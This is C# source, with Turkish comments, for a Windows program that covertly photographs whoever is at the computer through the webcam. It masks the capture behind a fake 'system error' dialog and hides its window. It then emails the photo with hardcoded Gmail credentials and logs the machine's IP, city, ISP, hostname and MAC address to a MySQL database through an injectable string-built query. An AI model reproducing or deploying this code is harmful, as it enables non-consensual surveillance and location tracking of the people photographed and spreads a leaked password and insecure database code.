using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;//mail gönderme
using System.IO;//resim transferi için gerekli dll
using MySql.Data.MySqlClient;//mysql için gerekli dll
using AForge.Video.DirectShow;//kamera için gerekli dll
using AForge.Video;//kamera için gerekli dll
using System.Net;//ip adresi için gerekli dll
using System.Management;//mac adresini almak için gerekli dll
using Newtonsoft.Json.Linq;//json veri çekme
using System.Net.NetworkInformation;//ping atmak için gerekli dosya
using ADODB;

namespace Gizli_Proje
{
    public partial class Form1 : Form
    {
        MySqlConnection baglanti = new MySqlConnection("Server=localhost; Database=kullanici_bilgileri; Uid=root;");//mysql baglantı kuruldu

        private FilterInfoCollection webcam;//bilgisayara bağlı kameraların tutlacagı dizi tanımlanıyor
        private VideoCaptureDevice cam;//bizim kullanacagımız aygıt

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
         
            webcam =new FilterInfoCollection(FilterCategory.VideoInputDevice);//bilgisayarda buluna tüm kameralar buraya atıldı

            foreach (FilterInfo kamera in webcam)
            {
                comboBox1.Items.Add(kamera.Name);
            }

            comboBox1.SelectedIndex = 0;
         
            basla();
        }


        void basla()
        {//aktif olan kamera tespit edliyor
            int uzunluk = comboBox1.Items.Count - 1;


            for (int i = 0; i <= uzunluk; i++)
            {
                cam = new VideoCaptureDevice(webcam[i].MonikerString);
                cam.NewFrame += new NewFrameEventHandler(fotocekme);
                cam.Start();

                if (pictureBox1.Image != null)
                {
                    break;
                }

            }

          
            MessageBox.Show("Sistem Hatasından Dolayı Kamera Yeniden Başlatılacak", "Sistem Hatası", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                
            pictureBox1.Image = pictureBox1.Image;//fotografın çekilme anı            
            cam.Stop();
            pictureBox1.Visible = false;
            
            //resim c dizinine kaydetme yeri 
            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            Bitmap resim = new Bitmap(pictureBox1.Image, 250, 250);
            resim.Save(@filepath + "resim1.jpg");
            timer1.Start();
          
        }

        void fotocekme(object sender,NewFrameEventArgs eventargs)
        {
            Bitmap bit = (Bitmap)eventargs.Frame.Clone();//anlık çekilen görüntü picturebox akatarıldı
            pictureBox1.Image = bit;
        }


        void fotokaydet()
        {
            //RESMİ BYTLARA AYIRMA ve MYSQL KAYDETME YERİ 

            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
            string[] yeni = filepath.Split('\\');
            string yeniadres = "";

            for (int i = 0; i < yeni.Length - 1; i++)
            {

                if (yeniadres == "")
                {
                    yeniadres = yeni[i];
                }
                else
                {
                    yeniadres = yeniadres + "\\" + yeni[i];
                }
            }

            yeniadres = yeniadres + "\\Desktopresim1.jpg";
           

            //mail gönderme alanı
            MailMessage ePosta = new MailMessage();
            ePosta.From = new MailAddress("mustafaakar048@gmail.com");
         
            ePosta.To.Add("mustafaakar0948@gmail.com");
            
            ePosta.Attachments.Add(new Attachment(yeniadres));
            
            ePosta.Subject = "Bilgisayarınız Kurcalanıyor";
            
            string saat1="Saat = "+DateTime.Now.ToLongTimeString()+"\nTarih = "+DateTime.Now.ToLongDateString()+" acıldı. \n\tDİKKATİNİZE...";
            ePosta.Body = saat1;
            
            SmtpClient smtp = new SmtpClient();
            
            smtp.Credentials = new NetworkCredential("mustafaakar048@gmail.com", "2143442fb");
            smtp.Port = 587;
            smtp.Host = "smtp.gmail.com";
            smtp.EnableSsl = true;
            object userState = ePosta;

            smtp.SendAsync(ePosta, (object)ePosta);

            System.Threading.Thread.Sleep(1500);

            //Resmi baytlara dönüştürme
            FileStream fs = new FileStream(yeniadres, FileMode.Open, FileAccess.Read);
        
            //BinaryReader ile byte dizisi ile FileStream arasında veri akışı sağlanıyor.

            BinaryReader br = new BinaryReader(fs);

            //ReadBytes ile FileStreamde belirtilen resim dosyasındaki byte lar

             //  byte dizisine aktarılıyor.
            

            byte[] img = br.ReadBytes((int)fs.Length);

            br.Close();

            fs.Close();

            //İnternetteen konum,ip,baglantı sahibi çekme
            WebClient adres = new WebClient();
            var adres1 = adres.DownloadString("http://ip-api.com/json");
            JObject objec = JObject.Parse(adres1);
            string sehir = objec["city"].ToString();//sehir
            string internetsahibi = objec["org"].ToString();//nereden baglandıgı
            string ip1 = objec["query"].ToString();//ip adresni alma
         
            string tarih = DateTime.Now.ToLongDateString();
            string saat = DateTime.Now.ToShortTimeString();
           
            
            string bilgisayaradi = Dns.GetHostName();//bilgisayarın adını alma yeri
         
        
            
            string mac = MAC();//mac adresini alma yeri
          
            baglanti.Open();

            string resimekle = "insert into kullanici_bilgileri.resimler (resim,bilgisayar_adi,saat,tarih,ip_adresi,mac_adresi,sehir,interneti_sahibi) values (@image,'"+bilgisayaradi+"','"+saat+"','"+tarih+"','"+ip1+"','"+mac+"','"+sehir+"','"+internetsahibi+"')";


            MySqlCommand command = new MySqlCommand(resimekle, baglanti);

            command.Parameters.Add("@image", MySqlDbType.Blob);
            command.Parameters["@image"].Value = img;
            command.ExecuteNonQuery();
            baglanti.Close();
           
            this.Close();

        }

        //mac adresinin tespiti için gerekli alan
        private string MAC()
        {
            ManagementClass manager = new ManagementClass("Win32_NetworkAdapterConfiguration");
            foreach (ManagementObject obj in manager.GetInstances())
            {
                if ((bool)obj["IPEnabled"])
                {
                    return obj["MacAddress"].ToString();
                }
            }

            return String.Empty;
        }

        int i = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            this.Hide();
            i++;
         
            if (i % 20 == 0)
            {
                try
                {
                    Ping myPing = new Ping();
                    String host = "google.com";
                    byte[] buffer = new byte[32];
                    int timeout = 1000;
                    PingOptions pingOptions = new PingOptions();
                    PingReply reply = myPing.Send(host, timeout, buffer, pingOptions);

                    if ((reply.Status == IPStatus.Success))
                    {
                        timer1.Stop();
                        fotokaydet();
                       
                    }
                }
                catch (Exception)
                {
                   

                }
            }
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
           
        }
    }
}
